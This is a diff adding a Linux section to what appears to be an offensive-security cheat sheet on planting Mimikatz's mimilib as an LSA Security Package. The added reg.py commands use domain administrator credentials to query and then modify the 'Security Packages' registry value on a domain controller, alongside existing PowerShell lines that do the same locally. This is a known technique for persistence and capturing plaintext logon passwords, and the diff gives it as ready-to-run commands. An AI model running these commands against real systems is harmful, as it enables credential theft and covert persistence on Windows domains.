@@ -46,3 +46,13 @@ BONUS
     $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
     $packages += "mimilib"
     Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
+
+## Linux
+
+##### Retrieve the actual values of Security Package
+
+    reg.py -dc-ip <DC_IP> 'domain.local'/'Administrator':'password'@dc.domain.local query -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\' -v 'Security Packages' -s
+
+##### Append mimilib to the previous list
+
+    reg.py -dc-ip <DC_IP> 'domain.local'/'Administrator':'password'@dc.domain.local add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\' -v 'Security Packages' -vd "<list> mimilib" -vt REG_MULTI_SZ
